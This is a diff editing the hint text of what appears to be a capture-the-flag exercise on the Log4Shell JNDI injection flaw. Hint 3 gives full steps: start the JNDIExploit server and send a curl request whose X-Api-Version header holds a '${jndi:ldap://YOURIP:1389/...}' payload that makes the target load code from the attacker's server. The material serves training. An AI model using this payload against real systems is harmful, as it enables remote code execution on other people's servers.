@@ -8,20 +8,20 @@ If you’re having trouble with JNDIExploit, maybe try looking at the "-h" flag?
 
 ### HINT 2
 
-"hostname -I" will give you your private IP address.
+The "hostname -I" command outputs your private IP address.
 
-"java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS" will start the server properly.
+Running "java –jar JNDIExploit-1.2-SNAPSHOT.jar -i PRIVATEIPADDRESS" starts the server properly on your PRIVATEIPADDRESS.
 
 Triple-check to make sure you’re using that IP address.
 
 The answer is the whole last line from the Terminal Emulator window where you first ran the JNDIExploit program. Punctuation and all.
 
-The answer is not "[+] Receive ClassRequest: SpringEchoTemplate.class"
+The answer isn't: "[+] Receive ClassRequest: SpringEchoTemplate.class"
 
 ### HINT 3
 
 1. Open a Terminal Emulator window
-2. Run "hostname -I" to get your ip address
+2. Run "hostname -I" to get your IP address
 3. Run "java –jar JNDIExploit-1.2-SNAPSHOT.jar -i YOURIP"
 4. Open another window and run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/SpringEcho}'"
 5. If you are successful, you should see a line that looks like the following show up in your original terminal window: "[+] Response code: 200"
